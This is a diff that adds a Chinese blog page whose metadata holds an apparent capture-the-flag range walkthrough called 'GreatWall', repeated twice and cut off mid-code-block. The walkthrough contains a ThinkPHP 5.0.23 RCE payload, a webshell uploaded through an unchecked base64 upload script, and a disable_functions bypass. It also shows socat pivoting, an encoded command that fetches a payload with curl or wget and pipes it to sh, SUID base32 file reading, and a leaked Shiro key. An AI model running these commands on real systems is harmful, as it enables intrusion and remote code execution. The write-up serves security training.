@@ -1,0 +1,2256 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 信息收集
+
+
+```bash
+┌──(root㉿MJ)-[~/tools/frp]
+└─# nmap --min-rate 10000 -p- 8.130.152.214
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 13:47 CST
+Warning: 8.130.152.214 giving up on port because retransmission cap hit (10).
+Nmap scan report for 8.130.152.214
+Host is up (0.15s latency).
+Not shown: 57617 closed tcp ports (reset), 7915 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 50.66 seconds
+```
+tcp开了两个web和一个ssh
+
+```bash
+┌──(root㉿MJ)-[~/tools/frp]
+└─# nmap -sU --top-ports 20 8.130.152.214
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 13:48 CST
+Nmap scan report for 8.130.152.214
+Host is up (0.029s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    closed        tftp
+123/udp   open|filtered ntp
+135/udp   open|filtered msrpc
+137/udp   open|filtered netbios-ns
+138/udp   open|filtered netbios-dgm
+139/udp   open|filtered netbios-ssn
+161/udp   closed        snmp
+162/udp   open|filtered snmptrap
+445/udp   open|filtered microsoft-ds
+500/udp   closed        isakmp
+514/udp   open|filtered syslog
+520/udp   closed        route
+631/udp   closed        ipp
+1434/udp  open|filtered ms-sql-m
+1900/udp  closed        upnp
+4500/udp  closed        nat-t-ike
+49152/udp closed        unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
+```
+udp一如既往先不看
+
+80端口没什么进展，目录扫描也没什么有用信息，8080端口同样但是有个404状态码，有些时候404的特征信息就可以暴露框架
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# dirsearch -u http://8.130.152.214:8080/
+
+Target: http://8.130.152.214:8080/
+
+[13:50:00] Starting:
+[13:50:24] 404 -    7KB - /index.php/login/
+[13:50:33] 200 -   24B  - /robots.txt
+[13:50:35] 301 -  322B  - /static  ->  http://8.130.152.214:8080/static/
+```
+有用的只有这三个，在访问/index.php/login/时暴露了框架信息
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# curl http://8.130.152.214:8080/index.php/login/                     
+
+<!DOCTYPE html>
+<html>
+<body>
+    <div class='echo'>
+            </div>
+        <div class='exception'>
+
+            <div class='info'><h1>页面错误！请稍后再试～</h1></div>
+
+    </div>
+
+
+
+    <div class='copyright'>
+        <a title='官方网站' href='http://www.thinkphp.cn'>ThinkPHP</a>
+        <span>V5.0.23</span>
+        <span>{ 十年磨一剑-为API开发设计的高性能框架 }</span>
+    </div>
+    </body>
+</html>
+```
+忽略样式信息可以看到架构是tp5.0.23
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# searchsploit ThinkPHP
+--------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                             |  Path
+--------------------------------------------------------------------------- ---------------------------------
+ThinkPHP - Multiple PHP Injection RCEs (Metasploit)                        | linux/remote/48333.rb
+ThinkPHP 2.0 - 'index.php' Cross-Site Scripting                            | php/webapps/33933.txt
+ThinkPHP 5.0.23/5.1.31 - Remote Code Execution                             | php/webapps/45978.txt
+ThinkPHP 5.X - Remote Command Execution                                    | php/webapps/46150.txt
+--------------------------------------------------------------------------- ---------------------------------
+```
+漏洞库可以看到有rce但是他这个exp有问题
+
+# Web
+
+```bash
+POST /index.php?s=captcha HTTP/1.1
+Host: 8.130.152.214:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
+```
+
+curl下即可得到回显
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# curl http://8.130.152.214:8080/index.php?s=captcha -X POST -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id'
+
+<body>
+    <div class='echo'>
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    </div>
+        <div class='exception'>
+
+            <div class='info'><h1>页面错误！请稍后再试～</h1></div>
+
+    </div>
+
+
+
+    <div class='copyright'>
+        <a title='官方网站' href='http://www.thinkphp.cn'>ThinkPHP</a>
+        <span>V5.0.23</span>
+        <span>{ 十年磨一剑-为API开发设计的高性能框架 }</span>
+    </div>
+    </body>
+```
+
+直接vshell上线即可，这里我用的云服务器打，不详细展示，有关vshell的可以自行搜索
+
+### flag1
+
+在根下可以拿到
+
+
+# 内网横向(第一层)
+
+```bash
+www-data@portal:/$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:48 brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0
+       valid_lft 1892158846sec preferred_lft 1892158846sec
+    inet6 fe80::216:3eff:fe05:948/64 scope link
+       valid_lft forever preferred_lft forever
+```
+有个内网段，传fscan扫描，这里严重怀疑云镜要坑沙砾了，后两位主机位www-data没有权限发icmp包，只能ping，太慢了，这里直接当24网段扫了，第一位主机位没存活
+
+```bash
+www-data@portal:/tmp$ ./fscan -h 172.28.23.17/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.28.23.33    is alive
+(icmp) Target 172.28.23.17    is alive
+(icmp) Target 172.28.23.26    is alive
+[*] Icmp alive hosts len is: 3
+172.28.23.26:22 open
+172.28.23.17:22 open
+172.28.23.33:22 open
+172.28.23.26:21 open
+172.28.23.33:8080 open
+172.28.23.17:8080 open
+172.28.23.26:80 open
+172.28.23.17:80 open
+[*] alive ports len is: 8
+start vulscan
+
+[+] ftp 172.28.23.26:21:anonymous
+   [->]OASystem.zip
+[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1
+[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file
+[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2
+```
+有效信息这些，梳理一下
+```bash
+172.28.23.26       
+	ftp -> 匿名登录有web源码
+	ssh 
+	http(80) -> OA系统
+172.28.23.33
+	ssh
+	http(8080) -> ERP -> spring headdump泄露，未授权访问
+
+```
+
+## 172.28.23.26
+
+### ftp
+
+下载源码审计在uploadbase64.php发现文件上传，可以把源码拉到本地，扫描器扫一下就出了
+
+```bash
+<?php
+/**
+ * Description: PhpStorm.
+ * Author: yoby
+ * DateTime: 2018/12/4 18:01
+ * Email:logove@qq.com
+ * Copyright Yoby版权所有
+ */
+$img = $_POST['imgbase64'];
+if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
+    $type = '.'.$result[2];
+    $path = 'upload/' . date('Y-m-d') . '-' . uniqid() . $type;
+}
+$img =  base64_decode(str_replace($result[1], '', $img));
+@file_put_contents($path, $img);
+exit('{'src':''.$path.''}');
+```
+
+### web
+
+先测试下
+```bash
+www-data@portal:/tmp/OAsystem$ echo test | base64
+dGVzdAo=
+www-data@portal:/tmp/OAsystem$ curl -X POST -d 'imgbase64=data:image/png;base64,dGVzdAo=' http://172.28.23.26
+/uploadbase64.php
+{'src':'upload/2025-12-18-69439d03999bd.png'}www-www-data@portal:/tmp/OAsystem$ curl http://172.28.23.26/upload/2025-12-18-69439d03999bd.png
+test
+```
+没检测后缀传个eval马拿下信息，看看disable_function
+```bash
+curl 'http://172.28.23.26/upload/2025-12-18-69439f1adcb82.php' -X POST -d '1=phpinfo();' | grep disable_function
+```
+
+```php
+pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl</td><td class='v'>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl
+```
+
+全禁完了，大概率**LD_PRELOAD**了，原理可以看[webshell绕过disable_functions | the0n3](https://the0n3.top/pages/disfunc/)
+
+这个是内网，所以蚁剑走个外网主机的代理去内网访问即可
+```bash
+www-data@portal:/tmp/OAsystem$ ./socat TCP-LISTEN:10001,fork TCP:172.28.23.26:80 &
+[1] 4300
+```
+绕过LD_PRELOAD后，蚁剑会在upload下生产.antproxy.php文件，
+
+```php
+<?php
+function get_client_header(){
+    $headers=array();
+    foreach($_SERVER as $k=>$v){
+        if(strpos($k,'HTTP_')===0){
+            $k=strtolower(preg_replace('/^HTTP/', '', $k));
+            $k=preg_replace_callback('/_\w/','header_callback',$k);
+            $k=preg_replace('/^_/','',$k);
+            $k=str_replace('_','-',$k);
+            if($k=='Host') continue;
+            $headers[]='$k:$v';
+        }
+    }
+    return $headers;
+}
+function header_callback($str){
+    return strtoupper($str[0]);
+}
+function parseHeader($sResponse){
+    list($headerstr,$sResponse)=explode('
+
+',$sResponse, 2);
+    $ret=array($headerstr,$sResponse);
+    if(preg_match('/^HTTP/1.1 d{3}/', $sResponse)){
+        $ret=parseHeader($sResponse);
+    }
+    return $ret;
+}
+
+set_time_limit(120);
+$headers=get_client_header();
+$host = '127.0.0.1';
+$port = 61212;
+$errno = '';
+$errstr = '';
+$timeout = 30;
+$url = '/2025-12-18-69439f1adcb82.php';
+
+if (!empty($_SERVER['QUERY_STRING'])){
+    $url .= '?'.$_SERVER['QUERY_STRING'];
+};
+
+$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
+if(!$fp){
+    return false;
+}
+
+$method = 'GET';
+$post_data = '';
+if($_SERVER['REQUEST_METHOD']=='POST') {
+    $method = 'POST';
+    $post_data = file_get_contents('php://input');
+}
+
+$out = $method.' '.$url.' HTTP/1.1\r\n';
+$out .= 'Host: '.$host.':'.$port.'\r\n';
+if (!empty($_SERVER['CONTENT_TYPE'])) {
+    $out .= 'Content-Type: '.$_SERVER['CONTENT_TYPE'].'\r\n';
+}
+$out .= 'Content-length:'.strlen($post_data).'\r\n';
+
+$out .= implode('\r\n',$headers);
+$out .= '\r\n\r\n';
+$out .= ''.$post_data;
+
+fputs($fp, $out);
+
+$response = '';
+while($row=fread($fp, 4096)){
+    $response .= $row;
+}
+fclose($fp);
+$pos = strpos($response, '\r\n\r\n');
+$response = substr($response, $pos+4);
+echo $response;
+
+```
+其中重要的是`$url = '/2025-12-18-69439f1adcb82.php';`字段
+他去web根下找这个php文件，包找不到的，所以改成upload下，不过改了之后仍然不行，也是很神奇，有点神奇
+
+最终方法是在web根下传了个system的get马，antproxy指过去`$url = '/shell.php';`不过蚁剑还是连不上实在没明白，但是直接curl antproxy可以执行命令
+```bash
+www-data@portal:/tmp/OAsystem$ curl 'http://172.28.23.26/upload/.antproxy.php?cmd=ls'
+Api
+Classes
+checklogin.php
+db.php
+db_oasystem.sql
+download
+fn.php
+index.php
+main.php
+manage
+nginx.htaccess
+oa4.png
+shell.php
+sqlbackup
+static
+system
+upfile.php
+upload
+upload.php
+uploadbase64.php
+uploadimage
+usertab.php
+ver.php
+```
+
+在外网主机做socat代理把10002端口流量转发到服务器上，上线vshell即可
+```
+www-data@portal:/tmp$ ./socat TCP4-LISTEN:10002,reuseaddr,fork TCP4:ip:port &
+[2] 4514
+www-data@portal:/tmp$ curl 'http://172.28.23.26/upload/.antproxy.php?cmd=echo+KGN1cmwgLWZzU0wgLW0xODAgaHR0cDovLzE3Mi4yOC4yMy4xNzoxMDAwMi9zbHR8fHdnZXQgLVQxODAgLXEgaHR0cDovLzE3Mi4yOC4yMy4xNzoxMDAwMi9zbHQpfHNo+|base64+-d|bash'
+```
+
+### flag2
+
+根下需要root才能读flag2
+```bash
+www-data@ubuntu-oa:/tmp$ find / -perm -4000 2>/dev/null
+/bin/fusermount
+/bin/ping6
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/staprun
+/usr/bin/base32
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/s-nail/s-nail-privsep
+```
+可以看到有base32，读完解码即可
+
+
+## 172.28.23.33/172.22.10.16
+
+### web
+同样走代理
+heapdump拿下来，分析一手可以得到，shiro框架
+```
+CookieRememberMeManager(ShiroKey)
+-------------
+algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES
+```
+
+
+<img width='2548' height='1295' alt='Image' src='https://github.com/user-attachments/assets/0aad6aa1-7825-4994-8588-8eb303c7eab5' />
+
+直接一把梭了，[SummerSec/ShiroAttack2: shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马）修复原版中NoCC的问题 https://github.com/j1anFen/shiro_attack](https://github.com/SummerSec/ShiroAttack2)
+
+继续上线vshell
+
+还开了个59696端口，同时发现新的内网段
+```bash
+ops01@ubuntu-erp:~$ file HashNote 
+HashNote: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1a23e8dbc5918602e6a0994df9b044d92ba96c87, for GNU/Linux 3.2.0, stripped
+ops01@ubuntu-erp:~$ ss -lnt
+State            Recv-Q           Send-Q                      Local Address:Port                        Peer Address:Port           Process           
+LISTEN           0                4096                        127.0.0.53%lo:53                               0.0.0.0:*                                
+LISTEN           0                128                               0.0.0.0:22                               0.0.0.0:*                                
+LISTEN           0                64                                0.0.0.0:59696                            0.0.0.0:*                                
+LISTEN           0                100                                     *:8080                                   *:*    
+```
+很多方法没找到具体pid，不过大概也可以猜到就是这个elf了，交给队友拷打了，继续内网
+
+### flag3
+
+在root下
+
+# 内网横向(第二层)
+
+```bash
+www-data@ubuntu-oa:/tmp$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:70 brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe05:970/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:08:f6 brd ff:ff:ff:ff:ff:ff
+    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe05:8f6/64 scope link 
+       valid_lft forever preferred_lft forever
+       
+ops01@ubuntu-erp:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:55 brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0
+       valid_lft 1892152665sec preferred_lft 1892152665sec
+    inet6 fe80::216:3eff:fe05:955/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:59 brd ff:ff:ff:ff:ff:ff
+    inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe05:959/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+
+```bash
+ops01@ubuntu-erp:/tmp/test$ ./fscan -h 172.22.10.16/24
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.4
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.22.10.28    is alive
+(icmp) Target 172.22.10.16    is alive
+[*] Icmp alive hosts len is: 2
+172.22.10.28:3306 open
+172.22.10.28:80 open
+172.22.10.28:22 open
+[*] alive ports len is: 5
+start vulscan
+[*] WebTitle http://172.22.10.28       code:200 len:1975   title:DooTask
+
+
+
+www-data@ubuntu-oa:/tmp/test$ ./fscan -h 172.22.14.6/24
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.4
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.22.14.37    is alive
+(icmp) Target 172.22.14.46    is alive
+(icmp) Target 172.22.14.6     is alive
+[*] Icmp alive hosts len is: 3
+172.22.14.46:80 open
+172.22.14.46:22 open
+172.22.14.37:22 open
+172.22.14.37:10250 open
+172.22.14.37:2379 open
+[*] alive ports len is: 8
+start vulscan
+[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor
+[+] InfoScan http://172.22.14.46       [Harbor] 
+[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
+[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]
+```
+
+
+有个主机**172.22.10.28**，开放ssh，mysql，web，还有两台**172.22.14.37**这台主机开放了22，10250端口和2379端口
+
+10250端口是Kubelet 的默认监听端口，用于与 API Server 通信，管理节点和容器的状态。">
+<meta property="og:title" content="GreatWall">
+<meta property="og:description" content="# 信息收集
+
+
+```bash
+┌──(root㉿MJ)-[~/tools/frp]
+└─# nmap --min-rate 10000 -p- 8.130.152.214
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 13:47 CST
+Warning: 8.130.152.214 giving up on port because retransmission cap hit (10).
+Nmap scan report for 8.130.152.214
+Host is up (0.15s latency).
+Not shown: 57617 closed tcp ports (reset), 7915 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 50.66 seconds
+```
+tcp开了两个web和一个ssh
+
+```bash
+┌──(root㉿MJ)-[~/tools/frp]
+└─# nmap -sU --top-ports 20 8.130.152.214
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 13:48 CST
+Nmap scan report for 8.130.152.214
+Host is up (0.029s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    closed        tftp
+123/udp   open|filtered ntp
+135/udp   open|filtered msrpc
+137/udp   open|filtered netbios-ns
+138/udp   open|filtered netbios-dgm
+139/udp   open|filtered netbios-ssn
+161/udp   closed        snmp
+162/udp   open|filtered snmptrap
+445/udp   open|filtered microsoft-ds
+500/udp   closed        isakmp
+514/udp   open|filtered syslog
+520/udp   closed        route
+631/udp   closed        ipp
+1434/udp  open|filtered ms-sql-m
+1900/udp  closed        upnp
+4500/udp  closed        nat-t-ike
+49152/udp closed        unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
+```
+udp一如既往先不看
+
+80端口没什么进展，目录扫描也没什么有用信息，8080端口同样但是有个404状态码，有些时候404的特征信息就可以暴露框架
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# dirsearch -u http://8.130.152.214:8080/
+
+Target: http://8.130.152.214:8080/
+
+[13:50:00] Starting:
+[13:50:24] 404 -    7KB - /index.php/login/
+[13:50:33] 200 -   24B  - /robots.txt
+[13:50:35] 301 -  322B  - /static  ->  http://8.130.152.214:8080/static/
+```
+有用的只有这三个，在访问/index.php/login/时暴露了框架信息
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# curl http://8.130.152.214:8080/index.php/login/                     
+
+<!DOCTYPE html>
+<html>
+<body>
+    <div class='echo'>
+            </div>
+        <div class='exception'>
+
+            <div class='info'><h1>页面错误！请稍后再试～</h1></div>
+
+    </div>
+
+
+
+    <div class='copyright'>
+        <a title='官方网站' href='http://www.thinkphp.cn'>ThinkPHP</a>
+        <span>V5.0.23</span>
+        <span>{ 十年磨一剑-为API开发设计的高性能框架 }</span>
+    </div>
+    </body>
+</html>
+```
+忽略样式信息可以看到架构是tp5.0.23
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# searchsploit ThinkPHP
+--------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                             |  Path
+--------------------------------------------------------------------------- ---------------------------------
+ThinkPHP - Multiple PHP Injection RCEs (Metasploit)                        | linux/remote/48333.rb
+ThinkPHP 2.0 - 'index.php' Cross-Site Scripting                            | php/webapps/33933.txt
+ThinkPHP 5.0.23/5.1.31 - Remote Code Execution                             | php/webapps/45978.txt
+ThinkPHP 5.X - Remote Command Execution                                    | php/webapps/46150.txt
+--------------------------------------------------------------------------- ---------------------------------
+```
+漏洞库可以看到有rce但是他这个exp有问题
+
+# Web
+
+```bash
+POST /index.php?s=captcha HTTP/1.1
+Host: 8.130.152.214:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
+```
+
+curl下即可得到回显
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# curl http://8.130.152.214:8080/index.php?s=captcha -X POST -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id'
+
+<body>
+    <div class='echo'>
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    </div>
+        <div class='exception'>
+
+            <div class='info'><h1>页面错误！请稍后再试～</h1></div>
+
+    </div>
+
+
+
+    <div class='copyright'>
+        <a title='官方网站' href='http://www.thinkphp.cn'>ThinkPHP</a>
+        <span>V5.0.23</span>
+        <span>{ 十年磨一剑-为API开发设计的高性能框架 }</span>
+    </div>
+    </body>
+```
+
+直接vshell上线即可，这里我用的云服务器打，不详细展示，有关vshell的可以自行搜索
+
+### flag1
+
+在根下可以拿到
+
+
+# 内网横向(第一层)
+
+```bash
+www-data@portal:/$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:48 brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0
+       valid_lft 1892158846sec preferred_lft 1892158846sec
+    inet6 fe80::216:3eff:fe05:948/64 scope link
+       valid_lft forever preferred_lft forever
+```
+有个内网段，传fscan扫描，这里严重怀疑云镜要坑沙砾了，后两位主机位www-data没有权限发icmp包，只能ping，太慢了，这里直接当24网段扫了，第一位主机位没存活
+
+```bash
+www-data@portal:/tmp$ ./fscan -h 172.28.23.17/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.28.23.33    is alive
+(icmp) Target 172.28.23.17    is alive
+(icmp) Target 172.28.23.26    is alive
+[*] Icmp alive hosts len is: 3
+172.28.23.26:22 open
+172.28.23.17:22 open
+172.28.23.33:22 open
+172.28.23.26:21 open
+172.28.23.33:8080 open
+172.28.23.17:8080 open
+172.28.23.26:80 open
+172.28.23.17:80 open
+[*] alive ports len is: 8
+start vulscan
+
+[+] ftp 172.28.23.26:21:anonymous
+   [->]OASystem.zip
+[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1
+[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file
+[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2
+```
+有效信息这些，梳理一下
+```bash
+172.28.23.26       
+	ftp -> 匿名登录有web源码
+	ssh 
+	http(80) -> OA系统
+172.28.23.33
+	ssh
+	http(8080) -> ERP -> spring headdump泄露，未授权访问
+
+```
+
+## 172.28.23.26
+
+### ftp
+
+下载源码审计在uploadbase64.php发现文件上传，可以把源码拉到本地，扫描器扫一下就出了
+
+```bash
+<?php
+/**
+ * Description: PhpStorm.
+ * Author: yoby
+ * DateTime: 2018/12/4 18:01
+ * Email:logove@qq.com
+ * Copyright Yoby版权所有
+ */
+$img = $_POST['imgbase64'];
+if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
+    $type = '.'.$result[2];
+    $path = 'upload/' . date('Y-m-d') . '-' . uniqid() . $type;
+}
+$img =  base64_decode(str_replace($result[1], '', $img));
+@file_put_contents($path, $img);
+exit('{'src':''.$path.''}');
+```
+
+### web
+
+先测试下
+```bash
+www-data@portal:/tmp/OAsystem$ echo test | base64
+dGVzdAo=
+www-data@portal:/tmp/OAsystem$ curl -X POST -d 'imgbase64=data:image/png;base64,dGVzdAo=' http://172.28.23.26
+/uploadbase64.php
+{'src':'upload/2025-12-18-69439d03999bd.png'}www-www-data@portal:/tmp/OAsystem$ curl http://172.28.23.26/upload/2025-12-18-69439d03999bd.png
+test
+```
+没检测后缀传个eval马拿下信息，看看disable_function
+```bash
+curl 'http://172.28.23.26/upload/2025-12-18-69439f1adcb82.php' -X POST -d '1=phpinfo();' | grep disable_function
+```
+
+```php
